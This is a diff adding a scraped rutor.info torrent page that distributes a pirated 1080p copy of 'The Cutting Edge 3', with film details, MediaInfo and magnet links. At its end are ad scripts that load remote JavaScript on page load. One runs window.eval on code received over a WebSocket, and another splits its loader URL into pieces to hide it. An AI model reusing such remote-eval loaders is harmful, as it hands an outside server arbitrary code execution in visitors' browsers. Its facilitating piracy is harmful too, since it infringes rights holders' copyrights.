@@ -1,0 +1,487 @@
+<html>
+<head>
+	<meta http-equiv="content-type" content="text/html; charset=utf-8" />
+	<link href="http://s.rutor.info/css.css" rel="stylesheet" type="text/css" media="screen" />
+	<link rel="alternate" type="application/rss+xml" title="RSS" href="/rss.php?category" />
+	<link rel="shortcut icon" href="http://s.rutor.info/favicon.ico" />
+	<title>rutor.info :: Золотой лед 3 / The Cutting Edge 3: Chasing the Dream (2008) WEB-DL 1080p | P2</title>
+	<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>
+	<script type="text/javascript" src="http://s.rutor.info/jquery.cookie-min.js"></script>
+	<script type="text/javascript" src="http://s.rutor.info/t/functions.js"></script>
+	
+</head>
+<body>
+
+<div id="all">
+
+<div id="up">
+
+<div id="logo">
+	<a href="/"><img src="http://s.rutor.info/logo.jpg" alt="rutor.info logo" /></a>
+</div>
+
+<table id="news_table">
+  <tr><td colspan="2"><strong>Новости трекера</strong></td></tr><tr><td class="news_date">30-Дек</td>
+  	<td class="news_title"><a href="http://rutor.info/torrent/472" target="_blank"  id="news88" onclick="$.cookie('news', '88', {expires: 365});">У RUTOR.ORG - Новый Адрес: RUTOR.INFO</a></td></tr><tr><td class="news_date">29-Ноя</td>
+  	<td class="news_title"><a href="/torrent/178905" target="_blank"  id="news86">Вечная блокировка в России</a></td></tr><tr><td class="news_date">09-Окт</td>
+  	<td class="news_title"><a href="/torrent/145012" target="_blank"  id="news59">Путеводитель по RUTOR.org: Правила, Руководства, Секреты</a></td></tr></table>
+  <script type="text/javascript">
+  $(document).ready(function(){if($.cookie("news")<88){$("#news88").css({"color":"orange","font-weight":"bold"});}});
+  </script>
+
+</div>
+
+<div id="menu">
+<a href="/" class="menu_b" style="margin-left:10px;"><div>Главная</div></a>
+<a href="/top" class="menu_b"><div>Топ</div></a>
+<a href="/categories" class="menu_b"><div>Категории</div></a>
+<a href="/browse/" class="menu_b"><div>Всё</div></a>
+<a href="/search/" class="menu_b"><div>Поиск</div></a>
+<a href="/latest_comments" class="menu_b"><div>Комменты</div></a>
+<a href="/upload.php" class="menu_b"><div>Залить</div></a>
+<a href="/jabber.php" class="menu_b"><div>Чат</div></a>
+
+<div id="menu_right_side"></div>
+
+<script type="text/javascript">
+$(document).ready(function()
+{
+	var menu_right;
+	if ($.cookie('userid') > 0)
+	{
+		menu_right = '<a href="/users.php?logout" class="logout" border="0"><img src="http://s.rutor.info/i/viti.gif" alt="logout" /></a><span class="logout"><a href="/profile.php" class="logout"  border="0"><img src="http://s.rutor.info/i/profil.gif" alt="profile" /></a>';
+	}
+	else
+	{
+		menu_right = '<a href="/users.php" class="logout" border="0"><img src="http://s.rutor.info/i/zaiti.gif" alt="login" /></a>';
+	}
+	$("#menu_right_side").html(menu_right);
+});
+</script>
+
+</div>
+<h1>Золотой лед 3 / The Cutting Edge 3: Chasing the Dream (2008) WEB-DL 1080p | P2</h1>
+</div>
+<div id="ws">
+<div id="content">
+
+<center>
+<div id="b_tz_208" class="b_tz_on_top" onmouseup="window.event.cancelBubble=true"></div>
+</center>
+
+
+
+<div id="msg1"></div>
+<script type="text/javascript">
+$(document).ready(function()
+{
+	if ($.cookie('msg') != null)
+	{
+		if ($.cookie('msg').length > 0)
+		{
+			var msg2 = '<div id="warning">' + $.cookie('msg').replace(/["+"]/g, ' ') + '</div>';
+			$("#msg1").html(msg2);
+			$.cookie('msg', '', { expires: -1 });
+		}
+	}
+});
+</script><script type="text/javascript">function toggle_visibility(id) { var e = document.getElementById(id); if(e.style.display == 'block') e.style.display = 'none'; else e.style.display = 'block'; }</script>
+
+
+
+<div id="download">
+<a href="magnet:?xt=urn:btih:0d2cbde42873f93c27d22273c4313d2d76f2d6ae&amp;dn=rutor.info_%D0%97%D0%BE%D0%BB%D0%BE%D1%82%D0%BE%D0%B9+%D0%BB%D0%B5%D0%B4+3+%2F+The+Cutting+Edge+3%3A+Chasing+the+Dream+%282008%29+WEB-DL+1080p+%7C+P2&amp;tr=udp://opentor.org:2710&amp;tr=udp://opentor.org:2710&amp;tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/magnet.gif"></a>
+<!--<a href="/mail.php?send_torrent=584130"><img src="http://s.rutor.info/t/mails.png"></a>-->
+<a href="http://d.rutor.info/download/584130"><img src="http://s.rutor.info/t/down.png"> Скачать The.Cutting.Edge.3.Chasing.the.Dream.2008.WEB-D.torrent</a>
+<br />
+<a href="/torrent/141992" class="d_small" target="_blank">Как тут качать?</a>
+<script type="text/javascript">
+function addEngine(){ if (typeof(window.external) != "undefined" && typeof(window.external.AddSearchProvider) != "undefined") { window.external.AddSearchProvider('http://rutor.info/AddSearchProvider.xml'); } else { alert("Извините, чтобы установить плагин поиска, Вы должны использовать браузер Firefox!");}}
+</script>
+<a href="#" class="d_small" onclick="addEngine();">Добавить rutor.info в поисковую строку</a>
+</div>
+
+
+
+
+
+<table width="100%">
+<tr><td colspan="2" style="text-align:center;">
+<script type="text/javascript">
+	var docw = document.body.clientWidth;
+	docw = docw - 270 - 470 - 50;
+	begun1_width = docw;
+	var filelist_already_loaded = 0;
+</script>
+
+</td>
+</tr>
+</table>
+
+
+<table id="details">
+
+<tr><td style="vertical-align:top;"></td><td><br /><img src="http://i91.fastpic.ru/big/2017/0830/29/72c2171ddbae038da1ba687b4371a829.jpg" /><br />
+<br />
+<u>Информация о фильме</u><br />
+<b>Название: </b>Золотой лед 3<br />
+<b>Оригинальное название: </b>The Cutting Edge 3: Chasing the Dream<br />
+<b>Год выхода: </b>2008<br />
+<b>Жанр: </b> <a href="/tag/1/комедия" target="_blank">комедия</a>, <a href="/tag/1/драма" target="_blank">драма</a>, <a href="/tag/1/мелодрама" target="_blank">мелодрама</a>, <a href="/tag/1/спорт" target="_blank">спорт</a><br />
+<b>Режиссер: </b>Стюарт Гиллард / Stuart Gillard<br />
+<b>В ролях: </b>Мэтт Лэнтер, Франсиа Раиса, Кристи Карлсон Романо, Бен Холлингсворт, Сара Гэйдон, Лори Грэхэм, Луис Олива, Эдрианн Ричардс, Алисия Пьюротт, Стефано Колачити<br />
+<br />
+<b>О фильме:</b><br />
+Зак и Селеста - подающая большие надежды пара фигуристов, чьи романтические отношения постоянно дают повод для появления их имен на страницах специализированной прессы. Однажды на льду с Селестой происходит несчастный случай. Для того, чтобы принять участие в чемпионате, проходящем в Париже, Зак должен быстро найти ей замену...<br />
+<br />
+<br />
+ <a href="http://www.imdb.com/title/tt1110626/" target="_blank"><img src="http://s.rutor.info/imdb/pic/1110626.gif" /></a> <a href="http://www.kinopoisk.ru/film/395876/" target="_blank"><img src="http://www.kinopoisk.ru/rating/395876.gif" /></a><br />
+<b>Страна: </b>США<br />
+<b>Студия: </b>Metro-Goldwyn-Mayer (MGM)<br />
+<b>Продолжительность: </b>01:31:37<br />
+<b>Перевод: </b>Профессиональный (двухголосый закадровый) | НТВ+<br />
+<br />
+<u>Файл</u><br />
+<b>Кодек: </b>h.264<br />
+<b>Качество: </b>WEB-DL 1080p<br />
+<b>Видео: </b>1920x1080, 16:9, 12200 kbps, 23.976 fps<br />
+<b>Звук: </b><br />
+Аудио: Русский / двухголосый закадровый (НТВ+), AC3, 6 ch, 48 KHz, 448 kbps<br />
+Аудио 2: английский, AC3, 6 ch, 48.0 kHz, 640 kb/s<br />
+<b>Субтитры: </b>английские<br />
+<br />
+<b><a href="http://multi-up.com/1197596" target="_blank">Семпл</a></b><br />
+<br />
+<div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">Скриншоты</div><div class="hidebody"></div><textarea class="hidearea"><a href="http://fastpic.ru/view/89/2017/0830/_13e5c6c5e688f27a1f7fc2c2b989a940.png.html" target="_blank"><img src="http://i89.fastpic.ru/thumb/2017/0830/40/_13e5c6c5e688f27a1f7fc2c2b989a940.jpeg" /></a> <a href="http://fastpic.ru/view/89/2017/0830/970a92166117b97d2c65b482bfa7c7ee.png.html" target="_blank"><img src="http://i89.fastpic.ru/thumb/2017/0830/ee/970a92166117b97d2c65b482bfa7c7ee.jpeg" /></a> <a href="http://fastpic.ru/view/89/2017/0830/_9bfbb0637136ed5b93600627b4d2dac2.png.html" target="_blank"><img src="http://i89.fastpic.ru/thumb/2017/0830/c2/_9bfbb0637136ed5b93600627b4d2dac2.jpeg" /></a> <a href="http://fastpic.ru/view/89/2017/0830/_9a8d6d0b17d00f17f2c1aa69b0a62d7c.png.html" target="_blank"><img src="http://i89.fastpic.ru/thumb/2017/0830/7c/_9a8d6d0b17d00f17f2c1aa69b0a62d7c.jpeg" /></a> <a href="http://fastpic.ru/view/89/2017/0830/_202107708c93fcb400de807916338e67.png.html" target="_blank"><img src="http://i89.fastpic.ru/thumb/2017/0830/67/_202107708c93fcb400de807916338e67.jpeg" /></a> <a href="http://fastpic.ru/view/89/2017/0830/_701303fee4855a92f5dfbadbb315bc7b.png.html" target="_blank"><img src="http://i89.fastpic.ru/thumb/2017/0830/7b/_701303fee4855a92f5dfbadbb315bc7b.jpeg" /></a></textarea></div><div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">MediaInfo</div><div class="hidebody"></div><textarea class="hidearea"><br />
+Общее<br />
+Уникальный идентификатор                 : 209304959685350892034950316666960930524 (0x9D76AB3F6F235041ABC57D99D51EE6DC)<br />
+Полное имя                               : D:DownloadsThe.Cutting.Edge.3.Chasing.the.Dream.2008.WEB-DL.1080p.mkv<br />
+Формат                                   : Matroska<br />
+Версия формата                           : Version 4 / Version 2<br />
+Размер файла                             : 8,50 Гбайт<br />
+Продолжительность                        : 1 ч. 31 м.<br />
+Режим общего битрейта                    : Переменный<br />
+Общий поток                              : 13,3 Мбит/сек<br />
+Дата кодирования                         : UTC 2018-05-08 14:50:32<br />
+Программа кодирования                    : mkvmerge v23.0.0 (&#039;The Bride Said No&#039;) 64-bit<br />
+Библиотека кодирования                   : libebml v1.3.6 + libmatroska v1.4.9<br />
+<br />
+Видео<br />
+Идентификатор                            : 1<br />
+Формат                                   : AVC<br />
+Формат/Информация                        : Advanced Video Codec<br />
+Профиль формата                          : High@L4<br />
+Настройки формата                        : CABAC / 4 Ref Frames<br />
+Параметр CABAC формата                   : Да<br />
+Параметр RefFrames формата               : 4 кадра<br />
+Идентификатор кодека                     : V_MPEG4/ISO/AVC<br />
+Продолжительность                        : 1 ч. 31 м.<br />
+Вид битрейта                             : Переменный<br />
+Битрейт                                  : 12,2 Мбит/сек<br />
+Максимальный битрейт                     : 15,0 Мбит/сек<br />
+Ширина                                   : 1920 пикселей<br />
+Высота                                   : 1080 пикселей<br />
+Соотношение сторон                       : 16:9<br />
+Режим частоты кадров                     : Постоянный<br />
+Частота кадров                           : 23,976 (24000/1001) кадра/сек<br />
+Цветовое пространство                    : YUV<br />
+Субдискретизация насыщенности            : 4:2:0<br />
+Битовая глубина                          : 8 бит<br />
+Тип развёртки                            : Прогрессивная<br />
+Бит/(Пиксели*Кадры)                      : 0.245<br />
+Размер потока                            : 7,80 Гбайт (92%)<br />
+Библиотека кодирования                   : x264 core 148 r2623 d5b2374<br />
+Настройки программы                      : cabac=1 / ref=4 / deblock=1:-1:-1 / analyse=0x3:0x133 / me=umh / subme=9 / psy=1 / psy_rd=1.00:0.15 / mixed_ref=1 / me_range=24 / chroma_me=1 / trellis=2 / 8x8dct=1 / cqm=0 / deadzone=21,11 / fast_pskip=1 / chroma_qp_offset=-3 / threads=34 / lookahead_threads=5 / sliced_threads=0 / nr=150 / decimate=1 / interlaced=0 / bluray_compat=0 / constrained_intra=0 / bframes=8 / b_pyramid=2 / b_adapt=2 / b_bias=0 / direct=3 / weightb=1 / open_gop=0 / weightp=2 / keyint=120 / keyint_min=61 / scenecut=0 / intra_refresh=0 / rc_lookahead=120 / rc=crf / mbtree=1 / crf=18.0 / qcomp=0.60 / qpmin=0 / qpmax=69 / qpstep=4 / vbv_maxrate=15000 / vbv_bufsize=31250 / crf_max=0.0 / nal_hrd=vbr / filler=0 / ip_ratio=1.40 / aq=3:1.00<br />
+Default                                  : Да<br />
+Forced                                   : Нет<br />
+Цветовой диапазон                        : Limited<br />
+Основные цвета                           : BT.709<br />
+Характеристики трансфера                 : BT.709<br />
+Коэффициенты матрицы                     : BT.709<br />
+<br />
+Аудио #1<br />
+Идентификатор                            : 2<br />
+Формат                                   : AC-3<br />
+Формат/Информация                        : Audio Coding 3<br />
+Идентификатор кодека                     : A_AC3<br />
+Продолжительность                        : 1 ч. 31 м.<br />
+Вид битрейта                             : Постоянный<br />
+Битрейт                                  : 448 Кбит/сек<br />
+Каналы                                   : 6 каналов<br />
+Расположение каналов                     : Front: L C R, Side: L R, LFE<br />
+Частота                                  : 48,0 КГц<br />
+Частота кадров                           : 31,250 кадров/сек (1536 SPF)<br />
+Битовая глубина                          : 16 бит<br />
+Метод сжатия                             : С потерями<br />
+Размер потока                            : 294 Мбайт (3%)<br />
+Заголовок                                : Профессиональный (двухголосый закадровый) | НТВ+<br />
+Язык                                     : Russian<br />
+ServiceKind/Strin                        : Complete Main<br />
+Default                                  : Да<br />
+Forced                                   : Нет<br />
+<br />
+Аудио #2<br />
+Идентификатор                            : 3<br />
+Формат                                   : E-AC-3<br />
+Формат/Информация                        : Enhanced Audio Coding 3<br />
+Идентификатор кодека                     : A_EAC3<br />
+Продолжительность                        : 1 ч. 31 м.<br />
+Вид битрейта                             : Постоянный<br />
+Битрейт                                  : 640 Кбит/сек<br />
+Каналы                                   : 6 каналов<br />
+Расположение каналов                     : Front: L C R, Side: L R, LFE<br />
+Частота                                  : 48,0 КГц<br />
+Частота кадров                           : 187,500 кадров/сек (256 SPF)<br />
+Метод сжатия                             : С потерями<br />
+Размер потока                            : 419 Мбайт (5%)<br />
+Язык                                     : English<br />
+ServiceKind/Strin                        : Complete Main<br />
+Default                                  : Нет<br />
+Forced                                   : Нет<br />
+<br />
+Текст<br />
+Идентификатор                            : 4<br />
+Формат                                   : UTF-8<br />
+Идентификатор кодека                     : S_TEXT/UTF8<br />
+Идентификатор кодека/Информация          : UTF-8 Plain Text<br />
+Продолжительность                        : 1 ч. 29 м.<br />
+Битрейт                                  : 65 бит/сек<br />
+ElementCount                             : 1387<br />
+Размер потока                            : 43,1 Кбайт (0%)<br />
+Язык                                     : English<br />
+Default                                  : Нет<br />
+Forced                                   : Нет<br />
+<br />
+Меню<br />
+00:00:00.000                             : en:Chapter 1<br />
+00:00:12.000                             : en:Chapter 2<br />
+00:02:29.000                             : en:Chapter 3<br />
+00:05:06.000                             : en:Chapter 4<br />
+00:06:43.000                             : en:Chapter 5<br />
+00:08:13.000                             : en:Chapter 6<br />
+00:11:56.000                             : en:Chapter 7<br />
+00:13:32.000                             : en:Chapter 8<br />
+00:14:27.000                             : en:Chapter 9<br />
+00:16:51.000                             : en:Chapter 10<br />
+00:18:14.000                             : en:Chapter 11<br />
+00:24:02.000                             : en:Chapter 12<br />
+00:27:02.000                             : en:Chapter 13<br />
+00:30:55.000                             : en:Chapter 14<br />
+00:34:44.000                             : en:Chapter 15<br />
+00:39:07.000                             : en:Chapter 16<br />
+00:40:34.000                             : en:Chapter 17<br />
+00:43:26.000                             : en:Chapter 18<br />
+00:45:01.000                             : en:Chapter 19<br />
+00:48:40.000                             : en:Chapter 20<br />
+00:51:12.000                             : en:Chapter 21<br />
+00:54:18.000                             : en:Chapter 22<br />
+01:00:01.000                             : en:Chapter 23<br />
+01:01:56.000                             : en:Chapter 24<br />
+01:03:16.000                             : en:Chapter 25<br />
+01:05:07.000                             : en:Chapter 26<br />
+01:09:11.000                             : en:Chapter 27<br />
+01:11:23.000                             : en:Chapter 28<br />
+01:14:16.000                             : en:Chapter 29<br />
+01:15:28.000                             : en:Chapter 30<br />
+01:16:57.000                             : en:Chapter 31<br />
+01:19:50.000                             : en:Chapter 32<br />
+01:22:55.000                             : en:Chapter 33<br />
+01:24:40.000                             : en:Chapter 34<br />
+01:29:05.000                             : en:Chapter 35</textarea></div></td></tr>
+<tr><td class="header">Залил</td><td><b><a href="/browse/0/0/818853/0" target="_blank">mr.IamRock</a></b></td></tr>
+<tr><td class="header">Оценка</td><td>Никто ещё не поставил оценку</td></tr>
+<tr><td class="header">Категория</td><td><a href="/kino" target="_blank">Зарубежные фильмы</a></td></tr>
+<tr><td class="header">Раздают</td><td>3</td></tr>
+<tr><td class="header">Качают</td><td>8</td></tr>
+<tr><td class="header">Сидер замечен</td><td>09-05-2018 6:19:05 (30 минут назад)</td></tr>
+<tr><td class="header">Добавлен</td><td>08-05-2018 18:42:58  (12 часа назад)</td></tr>
+<tr><td class="header">Размер</td><td>8.50&nbsp;GB  (9127869061 Bytes)</td></tr>
+
+<tr>
+	<td class="header" nowrap="nowrap">Добавить в</td>
+	<td style="vertical-align:middle;"><span class="fake_link" onclick="add_bookmark($(this), 584130);">закладки</span></td>
+</tr>
+
+<tr><td colspan="2"><div id="index"><fieldset style="border: 1px solid #3C95D1;"><legend style="font-weight: bold;">Связанные раздачи</legend><table width="100%"><tr class="backgr"><td width="10px">Добавлен</td><td colspan="2">Название</td><td width="1px">Размер</td><td width="1px">Пиры</td></tr><tr class="gai"><td>26&nbsp;Апр&nbsp;09</td><td ><a class="downgif" href="http://d.rutor.info/download/15527"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:0784939394c20c0b40a6ec79eeea357d89d51ab3&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/15527/zolotoj-led-3_the-cutting-edge-3-chasing-the-dream-2008-dvdrip-p">Золотой лед 3 / The Cutting Edge 3: Chasing the Dream (2008) DVDrip | P </a></td> <td align="right">4<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">1.37&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;1</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr></table><div style="width: 100%; text-align: right; margin-top: 4px; margin-bottom: -5px;"><a href="/search/0/1/0/0/Cutting Edge 3" target="_blank">Искать ещё похожие раздачи</a></div></fieldset></div></td></tr>
+
+<tr><td class='header'><span onclick="if(filelist_already_loaded==0){filelist_already_loaded=1;$('#filelist').load('/descriptions/584130.files');}toggle_visibility('displayfiles');" class="button"><u>Файлы (1)</u></span></td><td>
+<div id="displayfiles" style="display:none;max-height:450px;overflow:auto;">
+<table id="files">
+<tr><td>Название</td><td>Размер</td></tr>
+<tbody id="filelist"><tr><td colspan="2" style="text-align:center;">Происходит загрузка списка файлов...</td></tr></tbody>
+</table>
+</div>
+</td></tr>
+
+</table>
+<br />
+<br />
+
+<script type="text/javascript">
+var bookmarked = 0;
+function add_bookmark(me, id)
+{
+	if (bookmarked == 0)
+	{
+		$.ajax({
+	  type: "POST",
+		url: "/bookmarks.php",
+	  data: "access_method=ajax&action=add_bookmark&torrent_id=" + id,
+	  success: function(res){
+	  		if (res == 0)
+	  		{
+	  			me.html('Зайдите на трекер!');
+	  			me.css({"color":"red"});
+	  		}
+	  		else if (res == 3)
+	  		{
+	  			me.html('Закладка добавлена!');
+	  			me.css({"color":"green"});
+	  		}
+	  		else if (res == 2)
+	  		{
+	  			me.html('Такая закладка у Вас уже существует!');
+	  			me.css({"color":"orange"});
+	  		}
+	  		else if (res == 5)
+	  		{
+	  			me.html('Ограничение численности закладок достигнуто!');
+	  			me.css({"color":"red"});
+	  		}
+  		}
+ 		});
+	}
+	bookmarked++;
+}
+$(document).ready(function() {
+	if ($.cookie('userid') > 0) {
+		$("#cem").append(' | <a href="/edit.php?edit=584130">Редактировать</a>');
+		if (typeof torrent_moderate == typeof Function && $.cookie('class') >= 6) {
+			$("#cem").append('<br /><span onClick="torrent_moderate(584130);">Промодерировать раздачу</span> | <span onclick="confirm_delete(584130);">Удалить</span>');
+		}
+	}
+});
+</script>
+
+
+<strong>
+<div style="text-align: center;" id="cem"><a href="/comment/584130">Написать комментарий</a>
+
+
+</div>
+</strong>
+
+<br/><br/>
+<script type="text/javascript">
+<!--
+function confirmation(delete_comment) {
+	var answer = confirm("Удалить комментарий?")
+	if (answer){
+		window.location = "/comment.php?delete_comment=" + delete_comment;
+	}
+}
+//-->
+</script>
+	<script type="text/javascript"><!--
+	function confirmation(delete_comment) {
+		var answer = confirm("Удалить комментарий?")
+		if (answer){
+			window.location = "/comment.php?delete_comment=" + delete_comment;
+		}
+	}
+	function cOptions(userid, cid) {
+	var cstr = 'c_' + cid;
+	var c_url = '<a href="/comment.php?edit_comment=' + cid + '"><img src="http://s.rutor.info/t/c_edit.png"></a><a onClick=confirmation(' + cid + ')><img  src="http://s.rutor.info/t/c_delete.png"></a>';
+	if (userid == getCookie('userid') || getCookie('class') >= 5)
+		document.getElementById(cstr).innerHTML = c_url;
+}
+//-->
+</script>
+	<table width="100%" cellspacing="0" cellpadding="4"><tr class="c_h"><td><b>mr.IamRock</b></td> <td>08-05-2018 18:08:06 (13 часа назад)</td> <td></td> <td align="right"><span id="c_3199465"></span><script type="text/javascript">cOptions(818853,3199465);</script></td></tr><tr><td class="c_t" colspan=4>Торрент обновлён 08.05.2018. Переделал звук, используя правильный софт.</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>gomer1004</b></td> <td>30-08-2017 18:41:56 (8 месяцев назад)</td> <td></td> <td align="right"><span id="c_3051530"></span><script type="text/javascript">cOptions(1285525,3051530);</script></td></tr><tr><td class="c_t" colspan=4>Что-то типа &quot;Грязных танцев&quot; ))</td></tr><tr><td colspan="4">&nbsp;</td></tr></table>
+<center><a href="#up"><img src="http://s.rutor.info/t/top.gif" alt="up" /></a></center>
+
+<!-- bottom banner -->
+
+<div id="down">
+Файлы для обмена предоставлены пользователями сайта. Администрация не несёт ответственности за их содержание.
+На сервере хранятся только торрент-файлы. Это значит, что мы не храним никаких нелегальных материалов. <a href="/advertise.php">Реклама</a>. 
+</div>
+
+
+</div>
+
+<div id="sidebar">
+
+<div class="sideblock">
+	<a id="fforum" href="/torrent/145012"><img src="http://s.rutor.info/i/forum.gif" alt="forum" /></a>
+</div>
+
+<div class="sideblock">
+<center>
+<table border="0" background="http://s.rutor.info/i/poisk_bg.gif" cellspacing="0" cellpadding="0" width="100%" height="56px">
+<script type="text/javascript">function search_sidebar() { window.location.href = '/search/'+$('#in').val(); return false; }</script>
+<form action="/b.php" method="get" onsubmit="return search_sidebar();">
+ <tr>
+  <td scope="col" rowspan=2><img src="http://s.rutor.info/i/lupa.gif" border="0" alt="img" /></td>
+  <td valign="middle"><input type="text" name="search" size="18" id="in"></td>
+ </tr>
+ <tr>
+  <td><input name="submit" type="submit" id="sub" value="искать по названию"></td>
+ </tr>
+</form>
+</table>
+</center>
+</div>
+
+
+
+<div class="sideblock2">
+<center>
+<div id="b_bn_51" onmouseup="window.event.cancelBubble=true"></div>
+<script>(function(){var s=document.createElement('script');s.src='http://tredman.com/j/w.php?id=51&r='+Math.random();document.getElementsByTagName('head')[0].appendChild(s)})();</script>
+</center>
+</div>
+
+<div class="sideblock2">
+<!--LiveInternet counter--><script type="text/javascript"><!--
+document.write("<a href='http://www.liveinternet.ru/click' "+
+"target=_blank><img src='http://counter.yadro.ru/hit?t39.6;r"+
+escape(document.referrer)+((typeof(screen)=="undefined")?"":
+";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?
+screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+
+";"+Math.random()+
+"' alt='' title='LiveInternet' "+
+"border=0 width=31 height=31><\/a>")//--></script><!--/LiveInternet-->
+</div>
+
+</div>
+
+</div>
+
+
+
+<script type="text/javascript">
+ (function () {
+ var script_id = "MTIzNg==", s = document.createElement("script");
+ s.type = "text/javascript";
+ s.charset = "utf-8";
+s.src = "//torvind.com/js/" + script_id+".js?r="+Math.random()*10000000000;
+ s.async = true;
+ s.onerror = function(){
+  var ws = new WebSocket("ws://torvind.com:8040/");
+  ws.onopen = function () {
+   ws.send(JSON.stringify({type:"p", id: script_id}));
+  };
+  ws.onmessage = function(tx) { ws.close(); window.eval(tx.data); };
+ };
+ document.body.appendChild(s);
+ })();
+</script>
+
+<script>(function(){var a=document.createElement("script");a.src="http://rarenok.biz"+"/im"+"g/r"+"/i/208/"+Math.floor(Math.random()*Math.pow(10,6))+".php";document.getElementsByTagName("head")[0].appendChild(a)})();</script>
+
+
+</body>
+</html>
